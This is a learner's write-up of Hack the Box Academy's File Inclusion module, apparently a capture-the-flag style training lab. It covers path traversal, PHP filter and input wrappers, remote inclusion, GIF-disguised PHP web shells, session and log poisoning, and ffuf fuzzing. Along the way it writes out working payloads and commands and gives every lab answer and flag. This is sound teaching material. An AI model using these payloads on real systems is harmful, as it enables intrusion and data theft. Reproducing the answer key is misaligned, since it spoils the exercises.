# File Inclusion
* Source: [Hack the Box: Academy](https://academy.hackthebox.com/)
* Module: File Inclusion
* Tier: II
* Difficulty: Medium
* Category: Offensive
* Time estimate: 8 hours
* Date: DD-MM-YYYY
* Author: [DjikstraCS](https://github.com/DjikstraCS)

---
## Local File Inclusion (LFI)
### Question 1:
![](./attachments/Pasted%20image%2020220729095110.png)

*Hint: Read the passwd file*

Change the language to spanisha nd edit the URL parameter to `../../../../etc/passwd`.

![](./attachments/Pasted%20image%2020220729115604.png)

**Answer:** `barry`

### Question 2:
![](./attachments/Pasted%20image%2020220729095133.png)

*Hint: Don't forget to traverse paths*

Same again, this time insert `../../../../usr/share/flags/flag.txt` into parameter.

![](./attachments/Pasted%20image%2020220729115823.png)

**Answer:** `HTB{n3v3r_tru$t_u$3r_!nput}`

---
## Basic Bypasses
### Question:
![](./attachments/Pasted%20image%2020220729095303.png)

*Hint: Try to see what path the regular functionality uses*

Building payload `languages/....//....//....//....//flag.txt`.

Then URL encode it. 

![](./attachments/Pasted%20image%2020220729125047.png)

![](./attachments/Pasted%20image%2020220729125225.png)

**Answer:** `HTB{64$!c_f!lt3r$_w0nt_$t0p_lf!}`

---
## PHP Filters
### Question:
![](./attachments/Pasted%20image%2020220729095351.png)

*Hint: Try to find an interesting php configuration file*

```
┌──(kali㉿kali)-[~]
└─$ ffuf -w ~/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://46.101.2.216:32503/FUZZ.php

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://46.101.2.216:32503/FUZZ.php
 :: Wordlist         : FUZZ: /home/kali/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

en                      [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 40ms]
es                      [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 40ms]
index                   [Status: 200, Size: 2652, Words: 690, Lines: 64, Duration: 1748ms]
configure               [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 48ms]
```

Use payload `php://filter/read=convert.base64-encode/resource=configure`.

![](./attachments/Pasted%20image%2020220729131628.png)

Decode the base64 value:

```
┌──(kali㉿kali)-[~]
└─$ echo "PD9waHAKCmlmICgkX1NFUlZFUlsnUkVRVUVTVF9NRVRIT0QnXSA9PSAnR0VUJyAmJiByZWFscGF0aChfX0ZJTEVfXykgPT0gcmVhbHBhdGgoJF9TRVJWRVJbJ1NDUklQVF9GSUxFTkFNRSddKSkgewogIGhlYWRlcignSFRUUC8xLjAgNDAzIEZvcmJpZGRlbicsIFRSVUUsIDQwMyk7CiAgZGllKGhlYWRlcignbG9jYXRpb246IC9pbmRleC5waHAnKSk7Cn0KCiRjb25maWcgPSBhcnJheSgKICAnREJfSE9TVCcgPT4gJ2RiLmlubGFuZWZyZWlnaHQubG9jYWwnLAogICdEQl9VU0VSTkFNRScgPT4gJ3Jvb3QnLAogICdEQl9QQVNTV09SRCcgPT4gJ0hUQntuM3Yzcl8kdDByM19wbDQhbnQzeHRfY3IzZCR9JywKICAnREJfREFUQUJBU0UnID0+ICdibG9nZGInCik7CgokQVBJX0tFWSA9ICJBd2V3MjQyR0RzaHJmNDYrMzUvayI7" | base64 -d
<?php

if ($_SERVER['REQUEST_METHOD'] == 'GET' && realpath(__FILE__) == realpath($_SERVER['SCRIPT_FILENAME'])) {
  header('HTTP/1.0 403 Forbidden', TRUE, 403);
  die(header('location: /index.php'));
}

$config = array(
  'DB_HOST' => 'db.inlanefreight.local',
  'DB_USERNAME' => 'root',
  'DB_PASSWORD' => 'HTB{n3v3r_$t0r3_pl4!nt3xt_cr3d$}',
  'DB_DATABASE' => 'blogdb'
);

$API_KEY = "Awew242GDshrf46+35/k";
```

**Answer:** `HTB{n3v3r_$t0r3_pl4!nt3xt_cr3d$}`

---
## PHP Wrappers
### Question:
![](./attachments/Pasted%20image%2020220729095449.png)

```bash
┌──(kali㉿kali)-[~]
└─$ curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://68.183.36.105:30237/index.php?language=php://input&cmd=cat+/37809e2f8952f06139011994726d9ef1.txt"
<!DOCTYPE html>
<html lang="en">

(...)

<body>
    <div class="navbar">
        <a href="#home">Inlane Freight</a>
        (...)
        </div>
        <div class="description">
            <h1>History</h1>
            <h2>Containers</h2>
            HTB{d!$46l3_r3m0t3_url_!nclud3}

```

**Answer:** `HTB{d!$46l3_r3m0t3_url_!nclud3}`

---
## Remote File Inclusion (RFI)
### Question:
![](./attachments/Pasted%20image%2020220729095515.png)

Make shell php script:

```
┌──(kali㉿kali)-[~/Downloads]
└─$ echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

Starte Python server.

![](./attachments/Pasted%20image%2020220802135721.png)



**Answer:** `99a8fc05f033f2fc0cf9a6f9826f83f4`

---
## LFI and File Uploads
### Question:
![](./attachments/Pasted%20image%2020220729095538.png)

*Hint: Are you using the correct upload directory?*

Create `.gif` file with php script.

```
┌──(kali㉿kali)-[~]
└─$ echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif

```

Upload the file and get it's path, then insert it into the LFI vulnerable URL.

![](./attachments/Pasted%20image%2020220803104802.png)

**Answer:** `HTB{upl04d+lf!+3x3cut3=rc3}`

---
## Log Poisoning
### Question 1:
![](./attachments/Pasted%20image%2020220729095631.png)

```url
%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
```

```
/var/lib/php/sessions/sess_2ovcreidra6c7jdi4in354dmvt&cmd=id
```

Flag file:
```
/var/lib/php/sessions/sess_2ovcreidra6c7jdi4in354dmvt&cmd=cat+/c85ee5082f4c723ace6c0796e3a3db09.txt
```

**Answer:** `/var/www/html`

### Question 2:
![](./attachments/Pasted%20image%2020220729095652.png)

Shell script:

```
<?php system($_GET["cmd"]); ?>
```

**Answer:** `HTB{1095_5#0u1d_n3v3r_63_3xp053d}`

---
## Automated Scanning
### Question:
![](./attachments/Pasted%20image%2020220729095716.png)

*Hint: Use the LFI-Jhaddix.txt wordlist to find working LFI payloads, then use one of them to read the flag*

Find parameter:

```
┌──(kali㉿kali)-[~]
└─$ ffuf -w seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://209.97.142.95:31746/index.php?FUZZ=value' -fs 2309

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://209.97.142.95:31746/index.php?FUZZ=value
 :: Wordlist         : FUZZ: seclists/Discovery/Web-Content/burp-parameter-names.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response size: 2309
________________________________________________

view                    [Status: 200, Size: 1935, Words: 515, Lines: 56, Duration: 222ms]
:: Progress: [6453/6453] :: Job [1/1] :: 181 req/sec :: Duration: [0:00:36] :: Errors: 0 ::
```

Find value:

```
┌──(kali㉿kali)-[~]
└─$ ffuf -w seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://209.97.142.95:31746/index.php?view=FUZZ' -fs 1935

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://209.97.142.95:31746/index.php?view=FUZZ
 :: Wordlist         : FUZZ: seclists/Fuzzing/LFI/LFI-Jhaddix.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response size: 1935
________________________________________________

../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 3309, Words: 526, Lines: 82, Duration: 219ms]
../../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 3309, Words: 526, Lines: 82, Duration: 219ms]
../../../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 3309, Words: 526, Lines: 82, Duration: 219ms]
../../../../../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 3309, Words: 526, Lines: 82, Duration: 219ms]
../../../../../../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 3309, Words: 526, Lines: 82, Duration: 221ms]
../../../../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 3309, Words: 526, Lines: 82, Duration: 221ms]
:: Progress: [920/920] :: Job [1/1] :: 181 req/sec :: Duration: [0:00:05] :: Errors: 0 ::
```

Accessing the flag manually.

![](./attachments/Pasted%20image%2020220803123701.png)

**Answer:** `HTB{4u70m47!0n_f!nd5_#!dd3n_93m5}`

---
## File Inclusion Prevention
### Question 1:
![](./attachments/Pasted%20image%2020220729095823.png)

```
┌──(kali㉿kali)-[~]
└─$ sudo ssh htb-student@10.129.5.82
[sudo] password for kali: 
The authenticity of host '10.129.5.82 (10.129.5.82)' can't be established.
ED25519 key fingerprint is SHA256:L5fkRhfweP92OyfC55wP2g2ZR/kQXDGUGzVebHkSKUM.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.5.82' (ED25519) to the list of known hosts.
htb-student@10.129.5.82's password: 
Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-52-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed 03 Aug 2022 11:12:40 AM UTC

  System load:             0.0
  Usage of /:              61.6% of 3.87GB
  Memory usage:            11%
  Swap usage:              0%
  Processes:               169
  Users logged in:         0
  IPv4 address for ens192: 10.129.5.82
  IPv6 address for ens192: dead:beef::250:56ff:feb9:43a4

 * Introducing self-healing high availability clustering for MicroK8s!
   Super simple, hardened and opinionated Kubernetes for production.

     https://microk8s.io/high-availability
     
Last login: Mon Nov  9 20:03:47 2020
htb-student@lfi-harden:~$ ls /etc/php/
7.4
htb-student@lfi-harden:~$ ls /etc/php/7.4/
apache2  cli  mods-available
htb-student@lfi-harden:~$ ls /etc/php/7.4/apache2/php.ini 
/etc/php/7.4/apache2/php.ini
```

**Answer:** `/etc/php/7.4/apache2/php.ini`

### Question 2:
![](./attachments/Pasted%20image%2020220729095840.png)

*Hint: Place a PHP File in /var/www/html/ which contains a PHP Webshell using SYSTEM(), then use curl to execute the file. Be sure to restart apache after editing the PHP Configuration!*

I guessed it!

**Answer:** `security`

---
## Skills Assessment
### Question:
![](./attachments/Pasted%20image%2020220729095925.png)

![](./attachments/Pasted%20image%2020220804102007.png)

Deode base65:

![](./attachments/Pasted%20image%2020220804102125.png)

An admin panel with LFI vulnerability.

![](./attachments/Pasted%20image%2020220804102626.png)

Generate request with poisoned User Agent.

![](./attachments/Pasted%20image%2020220804103450.png)

Refresh the log page to get the flag.

![](./attachments/Pasted%20image%2020220804103609.png)

**Answer:** `a9a892dbc9faf9a014f58e007721835e`

---
**Tags:** [[Hack The Box Academy]]